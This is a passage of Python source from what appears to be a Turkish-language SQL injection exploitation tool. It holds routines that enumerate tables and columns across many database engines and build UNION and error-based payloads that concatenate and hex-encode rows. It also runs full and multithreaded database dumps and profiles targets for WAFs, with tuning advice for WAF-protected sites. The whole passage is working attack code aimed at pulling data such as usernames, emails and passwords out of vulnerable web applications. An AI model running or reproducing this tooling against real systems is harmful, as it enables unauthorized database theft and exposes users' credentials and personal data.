                sonuc = self.union_sorgu_calistir(url, param, sorgu, post_data=post_data)
                if sonuc is None:
                    continue
                sonuc_str = str(sonuc).strip()
                if not sonuc_str.isdigit():
                    # Sniper: HTML içerikli sahte pozitifi reddet
                    if rv and not rv.union_veri_temiz_mi(sonuc_str):
                        continue
                    # Sayısal değil ama HTML gürültüsü de yok → tablo var ama
                    # COUNT değil başka bir değer döndü; yine de kaydet
                self._log_payload_sonuc(sorgu, True, f"tablo={tablo} satır={sonuc_str}")

                # ── ConsistencyChecker: 3-sorgu tutarlılık doğrulaması ──────
                # Her bulunan tablo için aynı COUNT(*) sorgusunu 3 kez çalıştırır.
                # 3 sonuçta çoğunluk tutarlılığı sağlanamazsa yanlış-pozitif olarak
                # işaretlenir ve atlanır.  Özellikle zaman-tabanlı ve OOB
                # testlerde kararlılığı dramatik biçimde artırır.
                cc = self._dogrulayici_cc()
                if cc:
                    tutarli, _ = cc.kontrol(
                        sorgu_func=lambda t=tablo: self.union_sorgu_calistir(
                            url, param,
                            f"SELECT COUNT(*) FROM {t}",
                            post_data=post_data),
                        deneme=3,
                    )
                    if not tutarli:
                        self.log(
                            f"[BRUTE] ✗ {tablo}: 3-sorgu tutarlılık başarısız "
                            f"— yanlış-pozitif, atlanıyor"
                        )
                        continue

                bulunan.append(tablo)
                self.log(f"[BRUTE] ✔ Tablo doğrulandı: {tablo} ({sonuc_str} satır)")
            except Exception:
                continue

        self.log(f"[BRUTE] Tamamlandı: {len(bulunan)} tablo bulundu")
        return bulunan

    def kolonlari_al(self, url, param, tablo, hedef_db, post_data=None):
        self.log(f"[SQL] Kolonlar sorgulanıyor (tablo={tablo})...")
        dbms = self.tespit_dbms or "MySQL"

        sorgular = []
        if dbms in ("MySQL", "MariaDB"):
            sorgular = [
                f"SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='{tablo}' AND table_schema='{hedef_db}'",
                f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{tablo}'",
            ]
        elif dbms == "PostgreSQL":
            sorgular = [
                f"SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='{tablo}'",
            ]
        elif dbms == "Microsoft SQL Server":
            sorgular = [
                f"SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='{tablo}'",
                f"SELECT column_name FROM information_schema.columns WHERE table_name='{tablo}'",
            ]
        elif dbms == "Oracle":
            sorgular = [
                f"SELECT listagg(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM user_tab_columns WHERE table_name='{tablo.upper()}'",
            ]
        elif dbms == "SQLite":
            sorgular = [
                f"SELECT group_concat(name,',') FROM pragma_table_info('{tablo}')",
                f"SELECT sql FROM sqlite_master WHERE type='table' AND name='{tablo}'",
            ]
        elif dbms == "IBM DB2":
            sorgular = [
                f"SELECT LISTAGG(COLNAME, ',') WITHIN GROUP (ORDER BY COLNO) FROM SYSCAT.COLUMNS WHERE TABNAME='{tablo.upper()}' AND TABSCHEMA=CURRENT_SCHEMA",
            ]
        elif dbms in ("Firebird", "InterBase"):
            sorgular = [
                "SELECT LIST(RDB$FIELD_NAME, ',') FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME='" + tablo.upper() + "'",
            ]
        elif dbms in ("CockroachDB",):
            sorgular = [
                f"SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='{tablo}'",
            ]
        elif dbms == "ClickHouse":
            sorgular = [
                f"SELECT groupArray(name) FROM system.columns WHERE table='{tablo}' AND database=currentDatabase()",
            ]
        else:
            sorgular = [
                f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{tablo}'",
            ]

        for sorgu in sorgular:
            sonuc = self.union_sorgu_calistir(url, param, sorgu, post_data=post_data)
            if not sonuc:
                sonuc = self.hata_sorgu_calistir(url, param, sorgu, post_data=post_data)
            if sonuc and isinstance(sonuc, str) and len(sonuc) > 1:
                if ',' in sonuc:
                    return [c.strip() for c in sonuc.split(',') if c.strip()]
                # SQLite CREATE TABLE ayrıştır
                if 'CREATE TABLE' in sonuc.upper():
                    # Strip CREATE TABLE tablename ( prefix before parsing columns
                    ddl_body = re.sub(r'(?i)CREATE\s+TABLE\s+\w+\s*\(', '', sonuc, count=1)
                    kolon_match = re.findall(r'^\s*(\w+)\s+\w+', ddl_body, re.MULTILINE)
                    if kolon_match:
                        return kolon_match
                return [sonuc.strip()]

        # Fallback: genel kolon listesi
        self.log(f"[SQL] {tablo} için kolon bulunamadı — genel kolonlar kullanılıyor")
        return ["id", "username", "email", "password", "name", "data"]

    def tablo_verisi_cek(self, url, param, tablo, kolonlar,
                         limit=100, post_data=None):
        if not kolonlar:
            return []
        self.log(f"[SQL] {tablo} verisi çekiliyor (kolon={kolonlar}, limit={limit})...")

        dbms   = self.tespit_dbms or "MySQL"
        kolon_str = ", ".join(kolonlar[:8])  # en fazla 8 kolon

        SEP1, SEP2, SEP3 = "VLX|", "|VLX|", "|VLXE"

        # Yardımcı: CONCAT argümanlarını doğru biçimde oluştur
        def _concat_args(cols):
            # CONCAT('SEP1', col1, 'SEP2', col2, ..., coln, 'SEP3')
            parts = [f"'{SEP1}'"]
            for j, col in enumerate(cols):
                parts.append(col)
                if j < len(cols) - 1:
                    parts.append(f"'{SEP2}'")
            parts.append(f"'{SEP3}'")
            return ", ".join(parts)

        # HEX separator constant (hex of '<ROW>')
        HEX_SEP = '3C524F573E'

        if dbms in ("MySQL", "MariaDB"):
            # BUG FIX: HEX() wrapping ensures Turkish/Arabic/special chars arrive
            # as pure ASCII hex, completely bypassing HTTP encoding corruption.
            # Python decodes bytes.fromhex(result) to get clean UTF-8 text.
            birles_stili = f"CONCAT({_concat_args(kolonlar[:8])})"
            sorgu = (f"SELECT GROUP_CONCAT(HEX({birles_stili}) SEPARATOR '<ROW>')"
                     f" FROM {tablo} LIMIT {limit}")
        elif dbms == "PostgreSQL":
            birles = f"||'{SEP2}'||".join(f"COALESCE(CAST({k} AS TEXT),'')" for k in kolonlar[:8])
            sorgu = f"SELECT string_agg('{SEP1}'||{birles}||'{SEP3}','<ROW>') FROM (SELECT * FROM {tablo} LIMIT {limit}) t"
        elif dbms == "Microsoft SQL Server":
            birles = f"+'{SEP2}'+".join(f"ISNULL(CAST({k} AS NVARCHAR(MAX)),'')" for k in kolonlar[:8])
            sorgu = f"SELECT STRING_AGG('{SEP1}'+{birles}+'{SEP3}','<ROW>') FROM (SELECT TOP {limit} * FROM {tablo}) t"
        elif dbms == "SQLite":
            birles = f"||'{SEP2}'||".join(f"COALESCE(CAST({k} AS TEXT),'')" for k in kolonlar[:8])
            sorgu = f"SELECT group_concat('{SEP1}'||{birles}||'{SEP3}','<ROW>') FROM (SELECT * FROM {tablo} LIMIT {limit})"
        elif dbms == "Oracle":
            birles = f"||'{SEP2}'||".join(f"NVL(TO_CHAR({k}),'')" for k in kolonlar[:8])
            sorgu = f"SELECT listagg('{SEP1}'||{birles}||'{SEP3}','<ROW>') WITHIN GROUP (ORDER BY 1) FROM (SELECT * FROM {tablo} WHERE ROWNUM<={limit})"
        elif dbms == "IBM DB2":
            birles = f"||'{SEP2}'||".join(f"COALESCE(CAST({k} AS VARCHAR(1000)),'')" for k in kolonlar[:8])
            sorgu = f"SELECT LISTAGG('{SEP1}'||{birles}||'{SEP3}','<ROW>') WITHIN GROUP (ORDER BY 1) FROM (SELECT * FROM {tablo} FETCH FIRST {limit} ROWS ONLY) t"
        elif dbms in ("Firebird", "InterBase"):
            birles = f"||'{SEP2}'||".join(f"COALESCE(CAST({k} AS VARCHAR(1000)),'')" for k in kolonlar[:8])
            sorgu = f"SELECT LIST(FIRST {limit} '{SEP1}'||{birles}||'{SEP3}','<ROW>') FROM {tablo}"
        elif dbms in ("CockroachDB",):
            birles = f"||'{SEP2}'||".join(f"COALESCE(CAST({k} AS TEXT),'')" for k in kolonlar[:8])
            sorgu = f"SELECT string_agg('{SEP1}'||{birles}||'{SEP3}','<ROW>') FROM (SELECT * FROM {tablo} LIMIT {limit}) t"
        elif dbms == "ClickHouse":
            birles = f"||'{SEP2}'||".join(f"toString({k})" for k in kolonlar[:8])
            sorgu = f"SELECT groupArray(concat('{SEP1}',{birles},'{SEP3}')) FROM {tablo} LIMIT {limit}"
        else:
            birles_stili = f"CONCAT({_concat_args(kolonlar[:8])})"
            sorgu = f"SELECT GROUP_CONCAT({birles_stili}) FROM {tablo} LIMIT {limit}"

        ham = self.union_sorgu_calistir(url, param, sorgu, post_data=post_data)
        if not ham:
            ham = self.hata_sorgu_calistir(url, param, sorgu, post_data=post_data)
        if not ham:
            return []

        # ── MERKEZİ VERİ TEMİZLEME (VeriTemizleyici) ─────────────────────────
        # MySQL/MariaDB: HEX() sarmalı sayesinde gelen saf ASCII hex'i decode et.
        # Diğer DBMS'ler: ham yanıt string'ini binary/garbled kontrol ederek temizle.
        # Her iki durumda da VeriTemizleyici.mysql_hex_coz veya yanit_isle kullanılır
        # böylece tüm DB yanıtları orijinal içeriği bozmadan tek noktadan geçer.
        if dbms in ("MySQL", "MariaDB"):
            if _temizleyici:
                ham = _temizleyici.mysql_hex_coz(ham.strip() if ham else "")
            else:
                try:
                    ham = bytes.fromhex(ham.strip()).decode('utf-8', errors='replace')
                except (ValueError, AttributeError):
                    pass
        else:
            # PostgreSQL / MSSQL / SQLite / Oracle: binary/garbled veriyi temizle
            if _temizleyici and ham:
                ham = _temizleyici.yanit_isle(ham)

        veriler = []
        for elem in ham.split('<ROW>'):
            if not elem.strip():
                continue
            # BUG FIX (MySQL/MariaDB): each element is an individual HEX string;
            # decode it before parsing SEP1/SEP2/SEP3 markers.
            if dbms in ("MySQL", "MariaDB"):
                try:
                    satir_ham = bytes.fromhex(elem.strip()).decode('utf-8', 'replace')
                except (ValueError, AttributeError):
                    satir_ham = elem.strip()
            else:
                satir_ham = elem.strip()
            # BUG FIX (row validation): skip rows missing expected separators
            if SEP1 not in satir_ham and SEP3 not in satir_ham:
                continue
            satir_ham = satir_ham.strip()
            if satir_ham.startswith(SEP1):
                satir_ham = satir_ham[len(SEP1):]
            if satir_ham.endswith(SEP3):
                satir_ham = satir_ham[:-len(SEP3)]
            # SEP2 ('|VLX|') ile böl — basit '|' ile bölmek yanlış sonuç verir
            degerler = satir_ham.split(SEP2)
            satir = {}
            for j, k in enumerate(kolonlar[:8]):
                ham_hucre = degerler[j].strip() if j < len(degerler) else ""
                # Her hücreyi VeriTemizleyici'den geçir (binary/garbled koruması)
                satir[k] = _temizleyici.hucre_isle(ham_hucre) if _temizleyici else ham_hucre
            veriler.append(satir)
        return veriler

    def tam_veritabani_dump(self, url, param, hedef_db=None,
                            session_yoneticisi=None, log_func=None, post_data=None):
        _log = log_func or self.log
        _log("[DUMP] Başlatılıyor...")
        sonuc = {
            "veritabani": hedef_db or "?",
            "tablolar":   {},
            "meta": {"url": url, "param": param, "dbms": self.tespit_dbms,
                     "zaman": datetime.now().isoformat()}
        }

        if not hedef_db:
            hedef_db = self.mevcut_veritabani_al(url, param, post_data=post_data) or "main"
            sonuc["veritabani"] = hedef_db
            _log(f"[DUMP] ✔ Aktif DB: {hedef_db}")

        tablolar = self.tablolari_al(url, param, hedef_db, post_data=post_data)
        _log(f"[DUMP] ✔ {len(tablolar)} tablo tespit edildi: {', '.join(tablolar)}")

        for tablo in tablolar:
            if session_yoneticisi and session_yoneticisi.tablo_tamamlandi_mi(tablo):
                _log(f"[DUMP] ↩ {tablo} (session'dan yüklendi)")
                prev = session_yoneticisi.get("dump", {}).get("tablolar", {}).get(tablo, {})
                if prev:
                    sonuc["tablolar"][tablo] = prev
                continue

            _log(f"[DUMP] ▶ {tablo} dump ediliyor...")
            kolonlar = self.kolonlari_al(url, param, tablo, hedef_db, post_data=post_data)
            _log(f"[DUMP]   Kolonlar: {', '.join(kolonlar)}")
            veriler  = self.tablo_verisi_cek(url, param, tablo, kolonlar,
                                             post_data=post_data)
            tablo_veri = {
                "kolonlar": kolonlar,
                "veriler":  veriler,
                "satir_sayisi": len(veriler)
            }
            sonuc["tablolar"][tablo] = tablo_veri

            # ── CANLI DUMP EKRANI ──────────────────────────────────────────────
            _log(f"[DUMP] ✔ {tablo}: {len(veriler)} satır, {len(kolonlar)} kolon")
            if veriler:
                _log(f"[DUMP]   Kolon başlıkları: {' | '.join(kolonlar[:6])}")
                for r_idx, satir in enumerate(veriler[:3], 1):
                    ozet = " | ".join(str(satir.get(k,''))[:20] for k in kolonlar[:6])
                    _log(f"[DUMP]   Satır {r_idx}: {ozet}")
                if len(veriler) > 3:
                    _log(f"[DUMP]   ... (+{len(veriler)-3} satır daha)")

            if session_yoneticisi:
                session_yoneticisi.tablo_tamamlandi(tablo, tablo_veri)

        tablo_say = len(sonuc["tablolar"])
        satir_say = sum(v.get("satir_sayisi",0) for v in sonuc["tablolar"].values())
        _log(f"[DUMP] ═══ DUMP TAMAMLANDI: {tablo_say} tablo, {satir_say} satır ═══")
        return sonuc

    # ── BULK-FETCH ASENKRON DUMP ─────────────────────────────────────────────
    def tam_veritabani_dump_async(self, url: str, param: str,
                                  hedef_db: str = None,
                                  post_data=None,
                                  log_func=None,
                                  max_workers: int = 4,
                                  session_yoneticisi=None) -> dict:
        """
        Bulk-Fetch (Asenkron) Dump — tabloları paralel olarak çeker.

        Sıralı dump yerine ThreadPoolExecutor ile tüm tablolar aynı anda
        dump edilir — büyük veritabanlarında sıralı dump'a kıyasla 3–6x
        hız kazancı sağlanır.

        Güvenlik: union_sorgu_calistir / tablo_verisi_cek içindeki tek
        thread-unsafe operasyon _union_basarisiz bayrağıdır; bu bayrağın
        False→True geçişi Python GIL altında atomik olduğundan ek kilit
        gerektirmez. _dump_kilit yalnızca sonuc dict yazmaları için kullanılır.

        Parametreler:
            max_workers : Paralel iş parçacığı sayısı (varsayılan 4).
                          WAF'lı hedeflerde 1–2, zayıf hedeflerde 4–8 önerilir.
        """
        _log = log_func or self.log
        _log("[BULK-DUMP] Asenkron Bulk-Fetch başlatıldı...")

        if not hedef_db:
            hedef_db = self.mevcut_veritabani_al(url, param, post_data=post_data) or "main"
            _log(f"[BULK-DUMP] ✔ Aktif DB: {hedef_db}")

        tablolar = self.tablolari_al(url, param, hedef_db, post_data=post_data)
        _log(f"[BULK-DUMP] ✔ {len(tablolar)} tablo tespit edildi — "
             f"paralel dump başlıyor (workers={max_workers})")

        sonuc: Dict[str, Any] = {
            "veritabani": hedef_db,
            "tablolar":   {},
            "meta": {
                "url": url, "param": param, "dbms": self.tespit_dbms,
                "zaman": datetime.now().isoformat(), "mod": "bulk_async",
                "workers": max_workers,
            },
        }

        def _dump_bir_tablo(tablo: str):
            """Tek bir tabloyu dump eder — thread-safe."""
            try:
                if session_yoneticisi and session_yoneticisi.tablo_tamamlandi_mi(tablo):
                    prev = session_yoneticisi.get("dump", {}).get("tablolar", {}).get(tablo, {})
                    return tablo, prev or {"kolonlar": [], "veriler": [], "satir_sayisi": 0,
                                          "kaynak": "session"}
                kolonlar = self.kolonlari_al(url, param, tablo, hedef_db, post_data=post_data)
                veriler  = self.tablo_verisi_cek(url, param, tablo, kolonlar, post_data=post_data)
                veri = {
                    "kolonlar": kolonlar,
                    "veriler":  veriler,
                    "satir_sayisi": len(veriler),
                }
                if session_yoneticisi:
                    try:
                        session_yoneticisi.tablo_tamamlandi(tablo, veri)
                    except Exception:
                        pass
                return tablo, veri
            except Exception as e:
                return tablo, {"kolonlar": [], "veriler": [], "satir_sayisi": 0, "hata": str(e)}

        executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)
        try:
            futures = {executor.submit(_dump_bir_tablo, t): t for t in tablolar}
            for future in concurrent.futures.as_completed(futures, timeout=300):
                tablo = futures[future]
                try:
                    t, veri = future.result(timeout=120)
                    with self._dump_kilit:
                        sonuc["tablolar"][t] = veri
                    satir = veri.get("satir_sayisi", 0)
                    hata  = veri.get("hata", "")
                    if hata:
                        _log(f"[BULK-DUMP] ✗ {tablo}: {hata}")
                    else:
                        _log(f"[BULK-DUMP] ✔ {tablo}: {satir} satır, "
                             f"{len(veri.get('kolonlar',[]))} kolon")
                        if veri.get("veriler"):
                            kols = veri["kolonlar"][:5]
                            ozet = " | ".join(str(veri["veriler"][0].get(k,""))[:18]
                                              for k in kols)
                            _log(f"[BULK-DUMP]   → İlk satır: {ozet}")
                except concurrent.futures.TimeoutError:
                    _log(f"[BULK-DUMP] ✗ {tablo}: zaman aşımı")
                except Exception as e:
                    _log(f"[BULK-DUMP] ✗ {tablo}: {e}")
        except Exception as e:
            _log(f"[BULK-DUMP] Genel hata: {e}")
        finally:
            # Python 3.9+ cancel_futures=True, öncesi için try/except
            try:
                executor.shutdown(wait=False, cancel_futures=True)
            except TypeError:
                executor.shutdown(wait=False)

        tablo_say = len(sonuc["tablolar"])
        satir_say = sum(v.get("satir_sayisi", 0) for v in sonuc["tablolar"].values())
        _log(f"[BULK-DUMP] ═══ TAMAMLANDI: {tablo_say} tablo, {satir_say} satır ═══")
        return sonuc

    # ── HEDEF PROFİL ─────────────────────────────────────────────────────────
    def hedef_profille(self, url: str, param: str = "") -> Dict[str, Any]:
        """
        Hedefi hızlıca profiller — WAF, hız, hassasiyet.
        Dönen dict HedefProfilleyici.profil_cikart() ile aynı yapıdadır.
        Sniper Modu veya InjectionMotor'daki strateji kalibrasyonu için kullanılır.
        """
        try:
            from modüller.yanit_dogrulayici import HedefProfilleyici
            hp = HedefProfilleyici(self.http, log_func=self.log)
            return hp.profil_cikart(url, param)
        except Exception as e:
            self.log(f"[PROFIL] Profilleme hatası: {e}")
            return {
                "hiz": "medium", "waf": False, "waf_adi": None,
                "hassasiyet": "medium", "hata_hassas": False,
                "oneri_strateji": ["error", "union", "boolean", "time"],
                "profil_aciklama": "Profil alınamadı — varsayılan",
            }

    # ── CONSISTENCY CHECK (OOB/Hash payload) ─────────────────────────────────
    def oob_tutarlilik_kontrol(
        self,
        sorgu_func: Callable,
        deneme: int = 3,
    ) -> tuple:
        """
        OOB veya Hash tabanlı payload için 3-sorgu tutarlılık denetimi.
        sorgu_func: string döndüren callable (örn. lambda: self.union_sorgu_calistir(...))
        Dönüş: (tutarli: bool, deger: str|None)
        """
        cc = self._dogrulayici_cc()
        if cc:
            return cc.kontrol(sorgu_func, deneme=deneme)
        # Fallback — ConsistencyChecker yoksa tek sorgu sonucunu kabul et
        try:
            val = sorgu_func()
            return (bool(val), val)
        except Exception:
            return (False, None)
